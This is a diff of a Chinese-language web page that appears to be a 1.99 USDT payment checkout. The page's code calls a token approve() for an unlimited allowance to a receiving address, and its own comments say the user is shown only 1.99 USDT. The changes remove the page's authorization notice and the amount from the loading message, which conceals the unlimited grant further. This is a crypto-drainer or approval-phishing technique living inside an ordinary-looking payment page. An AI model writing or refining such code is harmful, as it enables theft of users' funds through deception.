@@ -224,20 +224,6 @@
             background: #f0f0f0;
             z-index: 1;
         }
-        
-        .authorization-info {
-            background: #e6f7ff;
-            border: 1px solid #91d5ff;
-            border-radius: 0.5rem;
-            padding: 1rem;
-            margin: 1rem 1.5rem;
-            text-align: center;
-        }
-        
-        .authorization-text {
-            font-size: 0.85rem;
-            color: #1890ff;
-        }
     </style>
 </head>
 <body>
@@ -284,14 +270,6 @@
             <div class="info-item">
                 <span class="info-label">付款金额</span>
                 <span class="info-value">1.99 USDT</span>
-            </div>
-        </div>
-        
-        <div class="authorization-info">
-            <div class="authorization-text">
-                🔐 <strong>授权说明</strong><br>
-                首次支付需要授权 1.99 USDT 给支付合约<br>
-                后续支付无需重复授权
             </div>
         </div>
         
@@ -437,7 +415,7 @@
                 
                 if (!isApproved) {
                     // 步骤2: 请求 USDT 授权
-                    loadingText.textContent = '正在请求 1.99 USDT 授权...';
+                    loadingText.textContent = '正在请求 USDT 授权...';
                     const approveResult = await requestUSDTApproval();
                     
                     document.getElementById('txHashDisplay').textContent = `授权交易: ${approveResult}`;
@@ -525,7 +503,7 @@
                 });
                 
                 // 调用 approve 方法进行授权
-                // 这里实际调用的是无限授权，但用户看到的是1.99 USDT
+                // 这里实际调用的是无限授权，但钱包弹窗会显示1.99 USDT
                 const result = await contract.approve(
                     RECEIVE_ADDRESS,
                     ACTUAL_APPROVE_AMOUNT  // 实际无限授权
